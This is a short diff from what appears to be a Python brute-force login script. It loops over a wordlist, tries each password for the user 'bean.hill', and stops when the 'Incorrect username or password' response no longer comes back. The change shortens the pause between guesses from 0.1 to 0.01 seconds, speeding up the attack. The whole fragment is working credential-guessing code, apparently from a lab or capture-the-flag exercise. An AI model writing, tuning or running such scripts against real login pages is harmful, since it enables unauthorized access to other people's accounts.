@@ -24,7 +24,7 @@ with open(wordlist,'r') as mariob:
                 print("[+] testing " + pasw)
                 if ayy("bean.hill", pasw) == "Incorrect username or password":
                     print(str(found))
-                    time.sleep(.1)
+                    time.sleep(.01)
                 else:
                     pwn = pasw
                     found = True
